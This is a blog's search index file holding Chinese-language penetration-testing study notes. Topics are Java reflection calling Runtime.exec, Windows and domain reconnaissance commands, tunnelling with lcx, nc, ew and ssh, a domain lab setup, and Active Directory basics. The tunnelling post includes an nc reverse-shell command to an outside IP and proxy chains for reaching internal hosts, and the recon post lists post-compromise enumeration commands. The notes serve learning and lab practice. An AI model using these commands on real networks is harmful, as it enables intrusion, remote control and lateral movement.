<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>反射机制</title>
    <link href="/2020/03/31/Java%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <url>/2020/03/31/Java%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为对Java Web安全这一块没有做过研究，所以趁着时间比较空闲学习一下Java Web安全的知识。</p><a id="more"></a><h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><h3 id="什么是Java反射机制？"><a href="#什么是Java反射机制？" class="headerlink" title="什么是Java反射机制？"></a>什么是Java反射机制？</h3><p>Java反射机制是一种间接操作目标对象的一种机制。其核心在于JVM在运行的时候再动态加载类。并且对于任意一个类，只要知道它的名称，都能知道它的所有属性和方法。对于任意一个对象，都能调用它的任意方法和属性。<br>Java反射机制是Java动态特性的体现，利用反射机制我们可以轻松实现对Java类的动态调用。</p><h3 id="Java反射常用类"><a href="#Java反射常用类" class="headerlink" title="Java反射常用类"></a>Java反射常用类</h3><pre><code>Java.lang.Class;Java.lang.ClassLoader;Java.lang.reflect.Constructor;Java.lang.reflect.Field;Java.lang.reflect.Method;Java.lang.reflect.Modifier;</code></pre><h3 id="Java反射常用方法"><a href="#Java反射常用方法" class="headerlink" title="Java反射常用方法"></a>Java反射常用方法</h3><ul><li>forName() 获取类</li><li>newInstance() 初始化类</li><li>getMethod() 获取类的方法</li><li>invoke() 执行类的方法</li></ul><h3 id="Java反射的实现"><a href="#Java反射的实现" class="headerlink" title="Java反射的实现"></a>Java反射的实现</h3><ul><li>Object.getClass() 如：String.getClass()</li><li>Test.class() 如：xxx.class()</li><li>Class.forName 如：class.forName(“java.lang.Runtime”)</li></ul><h2 id="实验-反射调用类方法"><a href="#实验-反射调用类方法" class="headerlink" title="实验 - 反射调用类方法"></a>实验 - 反射调用类方法</h2><h3 id="单例实例"><a href="#单例实例" class="headerlink" title="单例实例"></a>单例实例</h3><p>Runtime类的构造方法是私有的，只能通过单例模式用静态方法获取对象，即我们只能通过Runtime().getRuntime()获取Runtime对象。  </p><p>所以，对Runtime的反射代码如下：</p><pre><code>Class class1 = Class.forName(&quot;java.lang.Runtime&quot;);   class1.getMethod(&quot;exec&quot;,String.class).invoke(class1.getMethod(&quot;getRuntime&quot;).invoke(class1),&quot;calc.exe&quot;);</code></pre><p>反射的执行流程如下：</p><pre><code>Class class1 = Class.forName(&quot;java.lang.Runtime&quot;);  Method method1 = class1.getMethod(&quot;exec&quot;, String.class);  Method method2 = class1.getMethod(&quot;getRuntime&quot;);  Object run = method2.invoke(class1);  method1.invoke(run,&quot;calc.exe&quot;);  </code></pre><p>这里对invoke()函数做一点解释：<br>invoke的功能是执行方法，第一个参数根据方法的不同而不同  </p><ul><li>普通方法，则第一个参数为类的对象</li><li>静态方法，则第一个参数为类</li></ul><h3 id="有参构造的反射"><a href="#有参构造的反射" class="headerlink" title="有参构造的反射"></a>有参构造的反射</h3><p>针对有参数的构造函数，需要引入一个新的反射方法getConstructor  </p><p>getConstructor()，参数为目标类的构造函数参数，返回的是目标类的构造函数。  </p><p>因为Runtime的构造方法是私有的，这里用ProcessBuilder来实现</p><pre><code>Class class1 = Class.forName(&quot;java.lang.ProcessBuilder&quot;);  class1.getMethod(&quot;start&quot;).invoke(class1.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)));</code></pre><p>用上强制转化的代码（实际环境不一定存在）</p><pre><code>Class class1 = Class.forName(&quot;java.lang.ProcessBuilder&quot;);  ((ProcessBuilder)class1.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();</code></pre><h3 id="私有构造函数"><a href="#私有构造函数" class="headerlink" title="私有构造函数"></a>私有构造函数</h3><p>针对私有构造函数，我们可以通过getDeclared系列的函数进行反射。  </p><p>getDeclaredMethod()可以返回目标类的所有方法，包括私有的方法。  </p><p>这里用Runtime举例（因为它的构造方法是私有的）</p><pre><code>Class class1 = Class.forName(&quot;java.lang.Runtime&quot;);  Constructor a = class1.getDeclaredConstructor();  a.setAccessible(true);  class1.getMethod(&quot;exec&quot;, String.class).invoke(a.newInstance(),&quot;calc.exe&quot;);</code></pre><p>在这里面新出现了个setAccessible，它的作用是修改私有方法的作用域。获取私有方法后必须修改，否则无法成功调用</p><h2 id="实验-反射调用类成员"><a href="#实验-反射调用类成员" class="headerlink" title="实验 - 反射调用类成员"></a>实验 - 反射调用类成员</h2><h3 id="调用公有变量"><a href="#调用公有变量" class="headerlink" title="调用公有变量"></a>调用公有变量</h3><pre><code>Class class1 = Class.forName(&quot;com.javavuln.demo.Person&quot;);Field f1 = class1.getField(&quot;a&quot;);  System.out.println(f1.get(class1.newInstance()));</code></pre><h3 id="调用所有变量"><a href="#调用所有变量" class="headerlink" title="调用所有变量"></a>调用所有变量</h3><pre><code>Class class1 = Class.forName(&quot;com.javavuln.demo.Person&quot;);Field f1 = class1.getDeclaredField(&quot;b&quot;);f1.setAccessible(true);System.out.println(f1.get(class1.newInstance()));</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[<a href="https://javasec.org/javase/Reflection/Reflection.html]" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html]</a></p>]]></content>
    
    
    <categories>
      
      <category>Java Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java的反射机制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前置信息收集</title>
    <link href="/2020/03/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2020/03/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>进入内网，我们需要解决三个个问题</p><ul><li>who?</li><li>where?  </li><li>purview?<br>因此，内网的信息收集是内网渗透必不可少的一环<a id="more"></a></li></ul><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><p><code>net user</code></p><h3 id="查询本地管理员信息"><a href="#查询本地管理员信息" class="headerlink" title="查询本地管理员信息"></a>查询本地管理员信息</h3><p><code>net localgroup administrators</code></p><h3 id="查询当前在线用户"><a href="#查询当前在线用户" class="headerlink" title="查询当前在线用户"></a>查询当前在线用户</h3><p><code>query  user || qwinsta</code></p><h3 id="查询会话"><a href="#查询会话" class="headerlink" title="查询会话"></a>查询会话</h3><p><code>net session</code></p><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><h3 id="查看本机网络配置"><a href="#查看本机网络配置" class="headerlink" title="查看本机网络配置"></a>查看本机网络配置</h3><p><code>ipconfig /all</code></p><h3 id="查看arp缓存"><a href="#查看arp缓存" class="headerlink" title="查看arp缓存"></a>查看arp缓存</h3><p><code>arp -a</code></p><h3 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h3><p><code>route print</code></p><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><p><code>netstat -ano</code></p><h2 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h2><h3 id="主机版本"><a href="#主机版本" class="headerlink" title="主机版本"></a>主机版本</h3><p><code>systeminfo | findstr /b /c:&quot;OS Name&quot; /c:&quot;OS Version&quot;</code><br>中文版则如下：<br>systeminfo | findstr /b /c:”OS 名称” /c:”OS 版本”</p><h3 id="系统体系结构"><a href="#系统体系结构" class="headerlink" title="系统体系结构"></a>系统体系结构</h3><p><code>echo %processor_architecture%</code></p><h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p>使用wmic：<br><code>wmic product get name,version</code><br>使用PowerShell：<br><code>powershell &quot;get-wmiobject -class win32_product | select-object -property name,version&quot;</code></p><h3 id="杀软信息"><a href="#杀软信息" class="headerlink" title="杀软信息"></a>杀软信息</h3><p><code>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct get /format:LIST</code></p><h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><p><code>wmic service list brief</code></p><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p><code>tasklist /svc</code><br>或<br><code>wmic process list brief</code></p><h3 id="系统自启动项"><a href="#系统自启动项" class="headerlink" title="系统自启动项"></a>系统自启动项</h3><p><code>wmic startup get command,caption</code></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p><code>schtask /query /fo /list /v</code></p><h3 id="开机时长"><a href="#开机时长" class="headerlink" title="开机时长"></a>开机时长</h3><p><code>net statistics workstation</code></p><h3 id="系统补丁"><a href="#系统补丁" class="headerlink" title="系统补丁"></a>系统补丁</h3><p><code>systeminfo</code><br>或<br><code>wmic qfe get caption,description,hotfixid,installedon</code></p><h3 id="共享列表"><a href="#共享列表" class="headerlink" title="共享列表"></a>共享列表</h3><p><code>net share</code><br>或<br><code>wmic share get name,path,status</code></p><h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p><code>netsh firewall show config</code></p><h3 id="远程连接端口"><a href="#远程连接端口" class="headerlink" title="远程连接端口"></a>远程连接端口</h3><p><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p><h2 id="权限信息"><a href="#权限信息" class="headerlink" title="权限信息"></a>权限信息</h2><h3 id="当前权限"><a href="#当前权限" class="headerlink" title="当前权限"></a>当前权限</h3><p><code>whoami</code></p><h3 id="获取SID"><a href="#获取SID" class="headerlink" title="获取SID"></a>获取SID</h3><p><code>whoami /all</code></p><h3 id="获取用户详细信息"><a href="#获取用户详细信息" class="headerlink" title="获取用户详细信息"></a>获取用户详细信息</h3><p><code>net user xxx /domain</code></p><h2 id="判断域"><a href="#判断域" class="headerlink" title="判断域"></a>判断域</h2><p>当一台主机不清楚是否入域，我们可以通过以下方式判断</p><h3 id="net命令"><a href="#net命令" class="headerlink" title="net命令"></a>net命令</h3><p><code>net user /domain</code></p><h3 id="ipconfig命令"><a href="#ipconfig命令" class="headerlink" title="ipconfig命令"></a>ipconfig命令</h3><p>首先通过<code>ipconfig</code>获取IP信息<br>再通过<code>nslookup</code>反向解析查询IP地址，由此判断DNS服务器和域控是否在一台服务器上</p><h3 id="查看系统详细情况"><a href="#查看系统详细情况" class="headerlink" title="查看系统详细情况"></a>查看系统详细情况</h3><p>在系统详细信息里，会存有当前系统是否入域的情况<br><code>systeminfo | findstr /C:&quot;Domain&quot;</code></p><h3 id="查询当前登录域及登录情况"><a href="#查询当前登录域及登录情况" class="headerlink" title="查询当前登录域及登录情况"></a>查询当前登录域及登录情况</h3><p><code>net config workstation</code></p><h3 id="时间服务器判断主域"><a href="#时间服务器判断主域" class="headerlink" title="时间服务器判断主域"></a>时间服务器判断主域</h3><p>域控服务器通常也被当作时间服务器来使用，因此我们可以通过以下命令判断主域<br><code>net time /domain</code><br>根据结果不同来判断当前用户情况</p><ul><li>发生系统错误：存在域，但当前用户不是域用户</li><li>返回时间：存在域且当前用户为域用户</li><li>返回WORKGROUP：网络环境为工作组，不存在域</li></ul><h2 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h2><p>已经确认主机已入域，可以通过下面命令收集信息</p><h3 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h3><p><code>net view /domain</code>或<code>net user /domain</code></p><h3 id="查询域内机器"><a href="#查询域内机器" class="headerlink" title="查询域内机器"></a>查询域内机器</h3><p><code>net view /domain:xxx</code></p><h3 id="查询域用户组"><a href="#查询域用户组" class="headerlink" title="查询域用户组"></a>查询域用户组</h3><p><code>net group /domain</code></p><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><p><code>net group &quot;domain computers&quot; /domain</code></p><h3 id="获取密码策略"><a href="#获取密码策略" class="headerlink" title="获取密码策略"></a>获取密码策略</h3><p><code>net accounts /domain</code></p><h3 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h3><p><code>nltest /domain_trusts</code></p><h3 id="获取域内共享文件"><a href="#获取域内共享文件" class="headerlink" title="获取域内共享文件"></a>获取域内共享文件</h3><p><code>net view \\dc</code></p><h2 id="域控信息"><a href="#域控信息" class="headerlink" title="域控信息"></a>域控信息</h2><h3 id="查询域控名"><a href="#查询域控名" class="headerlink" title="查询域控名"></a>查询域控名</h3><p><code>nltest /dclist:xxx</code></p><h3 id="查询域控主机名"><a href="#查询域控主机名" class="headerlink" title="查询域控主机名"></a>查询域控主机名</h3><p><code>nslookup -type=srv +ldap._tcp</code></p><h3 id="查询域控组"><a href="#查询域控组" class="headerlink" title="查询域控组"></a>查询域控组</h3><p><code>net group &quot;domain controllers&quot; /domain</code></p><h3 id="查询主域控器"><a href="#查询主域控器" class="headerlink" title="查询主域控器"></a>查询主域控器</h3><p><code>netdom query pdc</code></p><h2 id="域内用户和管理员信息"><a href="#域内用户和管理员信息" class="headerlink" title="域内用户和管理员信息"></a>域内用户和管理员信息</h2><h3 id="查询域用户列表-1"><a href="#查询域用户列表-1" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><h4 id="域控查询"><a href="#域控查询" class="headerlink" title="域控查询"></a>域控查询</h4><p><code>net user /domain</code></p><h4 id="获取详细信息"><a href="#获取详细信息" class="headerlink" title="获取详细信息"></a>获取详细信息</h4><p><code>wmic useraccount get /all</code></p><h3 id="查询本地管理员组"><a href="#查询本地管理员组" class="headerlink" title="查询本地管理员组"></a>查询本地管理员组</h3><p><code>net localgroup administrators</code></p><h3 id="查询域管用户"><a href="#查询域管用户" class="headerlink" title="查询域管用户"></a>查询域管用户</h3><p><code>net group &quot;domain admins&quot; /domain</code></p><h3 id="查询管理员用户组"><a href="#查询管理员用户组" class="headerlink" title="查询管理员用户组"></a>查询管理员用户组</h3><p><code>net group &quot;enterprise admins&quot; /domain</code></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透</title>
    <link href="/2019/12/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2019/12/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透的过程中，我们会碰到一些列的复杂网络环境。因此如何穿透内网环境是渗透过程中必须要考虑的事。</p><a id="more"></a><h2 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h2><p>情景：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C</p><p>C可以访问公网，不能被公网访问</p><p>命令：<br>C：lcx.exe -slave 47.101.36.165 7777 127.0.0.1 3389<br>B：lcx.exe -listen 7777 8888</p><p>此时，可以主机A可以通过访问公网IP加端口8888来连接内网主机C的3389</p><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>情景：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C</p><p>C可以访问公网，不能被公网访问</p><p>命令：<br>B：nc -lvvp 8888<br>C：nc -t -e cmd 47.101.36.165 8888</p><p>此时，公网主机B能收到内网主机C的反弹cmd</p><h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><h3 id="情景1："><a href="#情景1：" class="headerlink" title="情景1："></a>情景1：</h3><p>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p><p>C主机可以访问公网，也可以访问内网，外网主机不能访问主机C和D</p><p>命令：<br>B：ew_linux_x64 -s rcsocks -l 8008 -e 7777<br>C：ew_win32.exe -s rssocks -d 47.101.36.165 -e 7777</p><h3 id="情景2："><a href="#情景2：" class="headerlink" title="情景2："></a>情景2：</h3><p>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p><p>C主机有公网IP和内网IP，只能访问内网D主机，无法访问其他内网主机，D主机无法访问外网</p><p>命令：<br>D：ew_linux_x64 -s ssocksd -l 8888<br>C：ew_win32.exe -s lcx_tran -l 1080 -f 192.168.100.244 -g 8888</p><p>再通过公网IP加端口就可以达到通过D主机访问内网资源的目的</p><h3 id="情景3："><a href="#情景3：" class="headerlink" title="情景3："></a>情景3：</h3><p>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p><p>C主机可以访问外网，仅能访问内网D主机，D主机不能访问外网，可以访问内网资源</p><p>B：ew_linux_x64 -s lcx_listen -l 8008 -e 8009<br>D：ew_linux_x64 -s ssocksd -l 9999<br>C：ew_win32.exe -lcx_slave -d 47.101.36.165 -e 8009 -f 192.168.100.244 -g 9999</p><p>此时，可以通过公网IP加端口作为代理，访问内网资源</p><p>三级跳例子：<br>./ew -s rcsocks -l 1080 -e 8888<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>./ew -s lcx_listen -l 9999 -e 7777<br>./ew -s rssocks -d 127.0.0.1 -e 7777<br>数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="情景1：-1"><a href="#情景1：-1" class="headerlink" title="情景1："></a>情景1：</h3><p>本地主机A<br>公网主机B</p><p>公网主机B存在mysql服务，但只能主机B本地访问</p><p>命令：<br>C：ssh -CfNg -L 1234 127.0.0.1:3306 <a href="mailto:root@47.101.36.165">root@47.101.36.165</a></p><p>此时，我们可以通过mysql -h 127.0.0.1 -u root -p -P 1234 来连接公网主机B的mysql</p><h3 id="情景2：-1"><a href="#情景2：-1" class="headerlink" title="情景2："></a>情景2：</h3><p>本地主机A<br>公网主机B<br>目标主机C</p><p>公网主机C可以访问外网，不可以被之间访问<br>采用远程转发，将主机C的端口转发至主机B，此时访问主机B的端口，即访问主机C的端口</p><p>命令：<br>C：ssh -CfNg -R 7777:127.0.0.1:80 <a href="mailto:root@47.101.36.176">root@47.101.36.176</a></p><p>此时，访问公网主机B的IP加7777端口即为访问主机C的80端口</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透环境搭建</title>
    <link href="/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近受大佬启发，觉得需要往内网方向有所了解。于是开始学习内网渗透。但是苦于没有什么现成的环境，只能够自己手动搭建。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>Windows server 2012 1台、Windows 7 2台、vmware</p><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p>windows server 2012（DC）: 域控服务器</p><p>IP：10.16.11.21</p><p>windows 7（DM）: 配备两张网卡，一张通物理机，一张通域内网</p><p>IP：10.16.11.22，192.168.100.196</p><p>windows 7（DM）: 一张网卡，通域内网</p><p>IP：10.16.11.23</p><h2 id="域控架设"><a href="#域控架设" class="headerlink" title="域控架设"></a>域控架设</h2><h3 id="配置IP与DNS"><a href="#配置IP与DNS" class="headerlink" title="配置IP与DNS"></a>配置IP与DNS</h3><p>首先要配置静态IP，在网络和共享中心里进行配置</p><p><img src="/images/Snipaste_2019-10-25_16-14-17.png" alt="Snipaste_2019-10-25_16-14-17.png"></p><h3 id="配置域服务"><a href="#配置域服务" class="headerlink" title="配置域服务"></a>配置域服务</h3><p>在服务器管理器-仪表盘里选择添加角色与功能</p><p><img src="/images/Snipaste_2019-10-25_16-19-05.png" alt="Snipaste_2019-10-25_16-19-05.png"></p><p>在服务器角色里选上Active Directory 域服务和DNS服务器</p><p><img src="/images/Snipaste_2019-10-25_16-31-03.png" alt="Snipaste_2019-10-25_16-31-03.png"></p><p>一路下一步</p><h3 id="提升为域控制器"><a href="#提升为域控制器" class="headerlink" title="提升为域控制器"></a>提升为域控制器</h3><p>在安装完成界面，点击将此服务器提升为域控制器</p><p><img src="/images/Snipaste_2019-10-25_16-33-52.png" alt="Snipaste_2019-10-25_16-33-52.png"></p><p>添加新的林，填写自己想要的林名</p><p><img src="/images/Snipaste_2019-10-25_16-36-14.png" alt="Snipaste_2019-10-25_16-36-14.png"></p><p>设置密码（这里需要设置强密码）</p><p><img src="/images/Snipaste_2019-10-25_16-37-42.png" alt="Snipaste_2019-10-25_16-37-42.png"></p><p>设置NetBIOS域名</p><p><img src="/images/Snipaste_2019-10-25_16-39-19.png" alt="Snipaste_2019-10-25_16-39-19.png"></p><p>相关文件路径</p><p><img src="/images/Snipaste_2019-10-25_16-40-19.png" alt="Snipaste_2019-10-25_16-40-19.png"></p><p>点击安装</p><p><img src="/images/Snipaste_2019-10-25_16-41-59.png" alt="Snipaste_2019-10-25_16-41-59.png"></p><p>安装成功后，会提示你重启</p><p><img src="/images/Snipaste_2019-10-25_16-44-31.png" alt="Snipaste_2019-10-25_16-44-31.png"></p><p>重启登陆后，即可看到结果</p><p><img src="/images/Snipaste_2019-10-25_16-50-08.png" alt="Snipaste_2019-10-25_16-50-08.png"></p><h2 id="入域"><a href="#入域" class="headerlink" title="入域"></a>入域</h2><h3 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h3><p>配置静态IP，DNS指向域控服务器</p><p><img src="/images/Snipaste_2019-10-25_16-54-02.png" alt="Snipaste_2019-10-25_16-54-02.png"></p><p>在计算机属性里入域</p><p><img src="/images/Snipaste_2019-10-25_16-54-55.png" alt="Snipaste_2019-10-25_16-54-55.png"></p><p>输入域管理密码</p><p><img src="/images/Snipaste_2019-10-25_16-56-14.png" alt="Snipaste_2019-10-25_16-56-14.png"></p><p>入域成功</p><p><img src="/images/Snipaste_2019-10-25_16-56-34.png" alt="Snipaste_2019-10-25_16-56-34.png"></p><p>重启后可以看见成效</p><p><img src="/images/Snipaste_2019-10-25_16-58-15.png" alt="Snipaste_2019-10-25_16-58-15.png"></p><p>另一台windows 7以同样方法入域</p><h2 id="配置内外网卡"><a href="#配置内外网卡" class="headerlink" title="配置内外网卡"></a>配置内外网卡</h2><p>这个时候，虽然我们将一个迷你的内网域环境配置成功。但是在这个域环境中，我们并没有一个合适的入口和出口与我们的物理机通信。我们无法将之当作真实的内网环境进行渗透测试学习。所以，我选取一台windows 7作为出入口，给它配置两张网卡，一张用来与外网（即物理机）通信，一张与域内网通信。</p><h3 id="添加网络适配器"><a href="#添加网络适配器" class="headerlink" title="添加网络适配器"></a>添加网络适配器</h3><p><img src="/images/Snipaste_2019-10-25_17-06-40.png" alt="Snipaste_2019-10-25_17-06-40.png"></p><p>在此处添加一张网络适配器，用作外网通信网卡。</p><p><img src="/images/Snipaste_2019-10-25_17-08-07.png" alt="Snipaste_2019-10-25_17-08-07.png"></p><p>设置网络适配器2为桥接模式</p><p><img src="/images/Snipaste_2019-10-25_17-08-39.png" alt="Snipaste_2019-10-25_17-08-39.png"></p><p>进入虚拟机查看，可以看见两张网卡可以同时启用</p><p><img src="/images/Snipaste_2019-10-25_17-10-17.png" alt="Snipaste_2019-10-25_17-10-17.png"></p><p>测试通信，通信完全正常，可以充当出入口</p><p><img src="/images/Snipaste_2019-10-25_17-11-43.png" alt="Snipaste_2019-10-25_17-11-43.png"></p><h2 id="架设完成"><a href="#架设完成" class="headerlink" title="架设完成"></a>架设完成</h2><p>至此，以及迷你的内网域环境就初步架设完成。其中包括：</p><ul><li><p>windows server 2012 （DC）</p><ul><li>IP 10.16.11.21</li></ul></li><li><p>windows 7 （DM，出入口服务器）</p><ul><li><p>IP 10.16.11.22</p></li><li><p>IP 192.168.100.196</p></li></ul></li><li><p>windows 7 （DM）</p><ul><li>IP 10.16.11.23</li></ul></li></ul><h2 id="一些遇到的小问题及解决方案"><a href="#一些遇到的小问题及解决方案" class="headerlink" title="一些遇到的小问题及解决方案"></a>一些遇到的小问题及解决方案</h2><h3 id="net-view-命令报6118错误"><a href="#net-view-命令报6118错误" class="headerlink" title="net view 命令报6118错误"></a><code>net view</code> 命令报6118错误</h3><p>这个需要先关闭防火墙，再在cmd里输入<code>net view</code>即可指向成功</p><h3 id="域控服务器无法ping通域用户"><a href="#域控服务器无法ping通域用户" class="headerlink" title="域控服务器无法ping通域用户"></a>域控服务器无法ping通域用户</h3><p>在防火墙的高级设置里，配置入站规则，启用域的文件和打印机共享（回显请求ICMP）规则，即可ping通</p><p><img src="/images/Snipaste_2019-10-25_17-22-42.png" alt="Snipaste_2019-10-25_17-22-42.png"></p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透基础概念</title>
    <link href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/"/>
    <url>/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初次了解域渗透，并不是很了解域的概念，并不清楚域的一些功用。因此记录一些前置的知识和自己的理解</p><a id="more"></a><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组是局域网中的一个概念，由若干同一地点、同一网络的用户组成的小组。</p><p>工作组中的计算机是对等的，即访问每台电脑需要用对应电脑的账户登陆，才能获取资源。</p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域–Domain，windows网络中独立运行的单位，域之间相互访问需要建立信任关系。信任是域与域之间的桥梁。两个域之间建立了信任关系，则可以跨域管理、实现跨域网络资源共享、相互通信与数据传输。</p><p>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部。每个域都有自己的安全策略。</p><p>简单来说，如果计算机入域，则各种策略全部由域控来定，登陆验证也是由域控来验证。如果你在域内存在账号密码，你可以用这个账号尼玛登陆域内任何一台计算机。而不像工作组，每一台计算机都有自己的账户，登陆验证也是在本机验证。</p><h3 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h3><p>域控–Domain Controller，顾名思义，就是负责来调控整个域的服务器。域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当计算机入域时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源。总的来说，域控就像是<strong>中央集权</strong>，每个用户通过<strong>中央</strong>提供的权利账户，通过验证，才能访问域内共享资源。</p><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>活动目录-Active Directory，windows网络上的目录服务，包含着整个域内的对象（用户账户、计算机账户、打印机、共享文件等）和安全策略。活动目录实现了目录服务，让我们能够对域内进行集中式管理。</p><ul><li><p>管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略</p></li><li><p>管理用户域账户、用户信息、通信录、用户组管理、用户身份认证、用户授权管理，实施组管理策略</p></li><li><p>管理网络共享资源（打印机、文件共享服务等）</p></li><li><p>系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等</p></li><li><p>支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统</p></li></ul><h3 id="域树、域林及林根域"><a href="#域树、域林及林根域" class="headerlink" title="域树、域林及林根域"></a>域树、域林及林根域</h3><ul><li><p>域树：由一组具有连续命名空间的域组成，树中的域层次越深级别越低，一个”.”则代表一个层次，树中的域通过信任关系连接，这些域共享同一表结构和配置，形成一个连续的域名空间，重点是连续的，这种结构关系就好比中央(DC)实施中央集权，地方上的县城就是一个一个的”域”，<strong>指定范围内</strong> 的县城构成一个市，也就是树。</p></li><li><p>域林：林由<strong>一个或多个</strong>域树组成，一个或多个，所以林是可以只包含一个树，就类似与直辖市，既是市，行政级别上又和省厅同级，一般林会由多个树组成，类似于一个省份下面有多个市，以上举的例子可能不是很贴切，不过大概上就是这个意思。</p></li><li><p>林根域：根域就是第一个被创建的域，可知林根域就是域林中第一个被创建的域。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见解析漏洞</title>
